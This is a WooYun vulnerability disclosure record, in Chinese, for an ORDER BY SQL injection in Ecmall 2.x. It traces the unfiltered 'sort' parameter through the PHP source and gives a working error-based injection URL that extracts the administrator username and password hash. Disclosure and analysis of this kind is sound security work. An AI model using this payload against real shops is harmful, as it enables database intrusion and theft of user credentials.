{"id": 7228, "wybug_id": "wooyun-2013-038213", "wybug_title": "Ecmall 2.x版本存在通杀SQL注入漏洞", "wybug_corp": "ShopEx", "wybug_author": "Chora", "wybug_date": "2013-09-26 10:50", "wybug_open_date": "2013-12-25 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向公众公开  简要描述： 本来想早点分析完然后奋斗ECSHOP...结果一直不给老衲机会啊,越来越不敢相信是不是官方版本了,是不是下错了.酒喝多了头有点晕.不知道有没有把分析写错... 详细说明：  order by 参数注入,后面不能跟union,但是可以用双重查询.select...from...order by 1 and (select user_name from ecm_member where user_id=1)或者select...from...order by 1,(select user_name from ecm_member where user_id=1)但是在第2个select里面可以用unionselect...from...order by 1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)或select...from...order by 1,(select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)app/my_goods.app.php\nfunction index()    {        /* 取得店铺商品分类 */        $this->assign('sgcategories', $this->_get_sgcategory_options());        $conditions = $this->_get_conditions();        $page = $this->_get_page();        $page_nolimit = array();        $goods_list = $this->_get_goods($conditions, $page); //跟进        $all_goods = $this->_get_goods($conditions, $page_nolimit);      ......    }    function _get_goods($conditions, &$page)    {        if (intval($_GET['sgcate_id']) > 0)        {            $cate_mod =& bm('gcategory', array('_store_id' => $this->_store_id));            $cate_ids = $cate_mod->get_descendant_ids(intval($_GET['sgcate_id']));        }        else        {            $cate_ids = 0;        }        // 标识有没有过滤条件        if ($conditions != '1 = 1' || !empty($_GET['sgcate_id']))        {            $this->assign('filtered', 1);        }        //更新排序        if (isset($_GET['sort']) && isset($_GET['order']))        {            $sort  = strtolower(trim($_GET['sort'])); //未过滤            $order = strtolower(trim($_GET['order']));            if (!in_array($order,array('asc','desc'))) //只限制了order,没有限制sort            {                $sort  = 'goods_id';                $order = 'desc';            }        }        else        {            $sort  = 'goods_id';            $order = 'desc';        }                if ($page)        {            $limit = $page['limit'];            $count = true;        }        else        {            $limit = '';            $count = false;        }        /* 取得商品列表 */                $goods_list = $this->_goods_mod->get_list(array(            'conditions' => $conditions,            'count' => $count,            'order' => \"$sort $order\", //select...from...order by 注入            'limit' => $limit,        ), $cate_ids);        return $goods_list;    }\nincludes/models/goods.model.php\nfunction get_list($params = array(), $scate_ids = array(), $desc = false, $no_picture = true)    {        is_int($scate_ids) && $scate_ids > 0 && $scate_ids = array($scate_ids);        extract($this->_initFindParams($params));//将上面数组的键名作为变量名,值作为变量的值(包含$order变量).......        /* 条件(WHERE) */        $conditions = $this->_getConditions($conditions, true);        $conditions .= \" AND gs.spec_id IS NOT NULL AND s.store_id IS NOT NULL \";        if ($scate_ids)        {......        }        /* 排序(ORDER BY) */        if ($order)        {            $order = ' ORDER BY ' . $this->getRealFields($order) . ', s.sort_order '; //跟进        }        /* 分页(LIMIT) */        $limit && $limit = ' LIMIT ' . $limit;        if ($count)        {            $this->_updateLastQueryCount(\"SELECT COUNT(*) as c FROM {$tables}{$conditions}\");        }        /* 完整的SQL */        $this->temp = $tables . $conditions;        $sql = \"SELECT {$fields} FROM {$tables}{$conditions}{$order}{$limit}\";        $goods_list = $index_key ? $this->db->getAllWithIndex($sql, $index_key) : $this->db->getAll($sql); //带入查询......    }\neccore/model/model.base.php\nfunction getRealFields($src_fields_list)    {        $fields = $src_fields_list;        if (!$src_fields_list)        {            $fields = '';        }        $fields = preg_replace('/([a-zA-Z0-9_]+)\\.([a-zA-Z0-9_*]+)/e', \"\\$this->_getFieldTable('\\\\1') . '.\\\\2'\", $fields); //正则无影响...        return $fields;    }\nhttp://localhost/ecmall/index.php?app=my_goods&act=index&order=asc&sort=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23   漏洞证明：  \n\n   修复方案：  过滤...   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-09-26 10:55 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-26 14:13 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  看来ecmall的漏洞不少    \n     2013-10-17 11:54 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  问题似乎有点大    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}